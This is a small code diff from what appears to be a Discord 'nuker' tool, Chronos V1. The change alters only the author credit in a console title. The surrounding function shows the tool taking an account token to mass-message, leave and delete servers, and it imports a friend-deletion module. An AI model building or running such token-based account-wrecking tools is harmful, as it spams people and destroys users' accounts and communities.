@@ -10,7 +10,7 @@ from utils.deleteFriends import *
 # ====================================================================================================================== #
 
 def start_nuke(token, content):
-    set_console_title("Chronos V1 | Made by gokimax | Nuker")
+    set_console_title("Chronos V1 | Made by maxツ#8355 | Nuker")
     massDM(token=token, content=content)
     leaveServer(token=token)
     deleteServers(token=token)
